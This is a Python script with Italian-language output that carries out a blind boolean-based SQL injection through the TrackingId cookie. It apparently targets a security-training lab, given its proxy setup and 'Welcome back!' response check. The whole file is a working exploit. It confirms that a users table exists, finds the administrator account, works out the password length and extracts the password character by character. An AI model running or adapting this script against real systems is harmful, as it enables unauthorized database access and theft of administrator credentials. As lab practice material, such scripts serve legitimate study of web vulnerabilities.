import requests
import sys
import urllib3
from string import ascii_lowercase

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}


def perform_request(url,sql_payload):
    cookies = {'TrackingId' : 'tqMaoZDPpJW0Htxb' + sql_payload , 'session' : 'lWsD6wuRCJYFRIyfrf3OYoVHrrD6C0U1'}
    r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
    response = r.text
    return response

def exploit_sqli_table_name(url):
    sql_payload = "' AND (SELECT 'x' FROM users LIMIT 1)='x'--"
    response = perform_request(url,sql_payload)
    if "Welcome back!" in response:
        print("[+] SQL Payload: %s\t| OK" % sql_payload)
        print("[+] La tabella users esiste nel database")
        return True
    print("[-] SQL Payload: %s\t| ERRORE" % sql_payload)
    print("[-] La tabella users non esiste nel database")
    return False

def exploit_sqli_username(url):
    sql_payload = "' AND (SELECT username FROM users WHERE username='administrator')='administrator'--"
    response = perform_request(url,sql_payload)
    if "Welcome back!" in response:
        print("[+] SQL Payload: %s\t| OK" % sql_payload)
        print("[+] L'utente administrator esiste nel database")
        return True
    print("[-] SQL Payload: %s\t| ERRORE" % sql_payload)
    print("[-] L'utente administrator non esiste nel database")
    return False

def exploit_sqli_password_length(url):
    for i in range(1,50):
        sql_payload = "' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>%i)='administrator'--" %i
        response = perform_request(url,sql_payload)
        if "Welcome back!" not in response:
            print("[+] La lunghezza della password è di %s caratteri" % str(i))
            return i
        
def exploit_sqli_password_enumerator(url,password_length):
    password_chars = [""] * password_length
    adminpsw = ""
    alc = ascii_lowercase
    for i in range (0,10):
        alc = alc + str(i)
    for i in range(1,password_length+1):
        for x in alc:
            sql_payload = "' AND (SELECT SUBSTRING(password, {0}, 1) FROM users WHERE username='administrator')='{1}'--".format(i, x)
            response = perform_request(url,sql_payload)
            sys.stdout.write('\r'+ x)
            sys.stdout.flush()
            if "Welcome back!" in response:
                password_chars[i-1] = x
                print(password_chars)
                break
    adminpsw = adminpsw.join(password_chars)
    print("[+] La password di administrator è: %s" % adminpsw)
    return adminpsw


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Utilizzo: %s <url>" % sys.argv[0])
        print("[-] Esempio: %s www.example.com" % sys.argv[0])
        sys.exit()


print("\n[+] Analizzia il database\n")

print("[+] Verificando se la tabella users è presente nel database..")
exploit_sqli_table_name(url)

print("\n[+] Verificando se esiste l'utente administrator...")
exploit_sqli_username(url)

print("\n[+] Calcolando la lunghezza della password di administrator...")
password_length = exploit_sqli_password_length(url)

print("\n[+] Estrapolando la password di administrator...")
exploit_sqli_password_enumerator(url,password_length)